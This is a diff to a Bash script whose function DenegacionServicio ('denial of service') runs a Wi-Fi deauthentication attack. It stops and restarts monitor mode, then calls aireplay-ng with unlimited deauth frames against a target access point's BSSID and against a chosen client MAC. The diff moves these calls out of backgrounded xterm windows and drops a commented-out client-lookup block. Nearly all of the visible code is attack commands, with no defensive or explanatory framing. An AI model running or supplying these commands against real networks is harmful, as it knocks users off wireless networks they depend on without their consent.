@@ -16,7 +16,6 @@ DenegacionServicio() {
 		TARJETA_SELECCIONADA_MAC=$(echo "$CLIENT" | awk -F "," {' print $1 '})		
 	fi
 
-	
 	TARJETA_MODO_MONITOR=$(head -1 "$ARCHIVO_TARJETA_MONITOR" | tail -1) 
 	sudo airmon-ng stop $TARJETA_MODO_MONITOR
 
@@ -26,17 +25,9 @@ DenegacionServicio() {
 	X1="airmon-ng start $INTERFAZ $CANAL"
 	sleep 10s
 
-	sudo xterm -hold -e "aireplay-ng -0 0 -a $BSSID $TARJETA_MODO_MONITOR" &
+	aireplay-ng -0 0 -a $BSSID $TARJETA_MODO_MONITOR
 	X2="aireplay-ng -0 0 -a $BSSID $TARJETA_MODO_MONITOR"
-
-	#SI hay cliente conectado
-	#BuscarClienteConectado $ARCHIVO_CAP $BSSID
-	#if [ "$TARJETA_SELECCIONADA_MAC" == "" ]
-	#then
-	#	TARJETA_SELECCIONADA_MAC=$(head -1 "$LOG_TARJETA" | tail -1)
-	#fi
-
-	sudo xterm -hold -e "aireplay-ng -0 0 -a $BSSID -c $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR" &
+	aireplay-ng -0 0 -a $BSSID -c $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR
 	X3="aireplay-ng -0 0 -a $BSSID -c $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR"
 
 	TIEMPO_ESCANEO="10"
